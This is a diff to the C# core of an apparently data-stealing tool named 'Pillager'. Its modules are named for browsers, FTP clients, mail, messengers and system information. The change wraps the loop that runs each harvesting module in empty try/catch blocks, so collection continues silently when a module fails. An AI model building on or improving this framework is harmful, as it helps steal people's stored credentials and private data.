@@ -2,14 +2,7 @@
 using System.Diagnostics;
 using System.IO;
 using System.Reflection;
-using Pillager.Browsers;
-using Pillager.FTPs;
 using Pillager.Helper;
-using Pillager.Mails;
-using Pillager.Messengers;
-using Pillager.Softwares;
-using Pillager.SystemInfos;
-using Pillager.Tools;
 
 namespace Pillager
 {
@@ -64,9 +57,13 @@ namespace Pillager
             {
                 if (type.IsSubclassOf(typeof(ICommand)))
                 {
-                    File.AppendAllText(logpath, "Try to save "+type.Name +" to "+ savepath+". ");
-                    var instance = (ICommand)Activator.CreateInstance(type);
-                    instance.Save(savepath);
+                    File.AppendAllText(logpath, "Try to save " + type.Name + " to " + savepath + ". ");
+                    try
+                    {
+                        var instance = (ICommand)Activator.CreateInstance(type);
+                        instance.Save(savepath);
+                    }
+                    catch { }
                     File.AppendAllText(logpath, "Finished!" + Environment.NewLine);
                 }
             }
@@ -81,8 +78,12 @@ namespace Pillager
                 if (type.IsSubclassOf(typeof(ICommandOnce)))
                 {
                     File.AppendAllText(logpath, "Try to save " + type.Name + " to " + savepath + ". ");
-                    var instance = (ICommandOnce)Activator.CreateInstance(type);
-                    instance.Save(savepath);
+                    try
+                    {
+                        var instance = (ICommandOnce)Activator.CreateInstance(type);
+                        instance.Save(savepath);
+                    }
+                    catch { }
                     File.AppendAllText(logpath, "Finished!" + Environment.NewLine);
                 }
             }
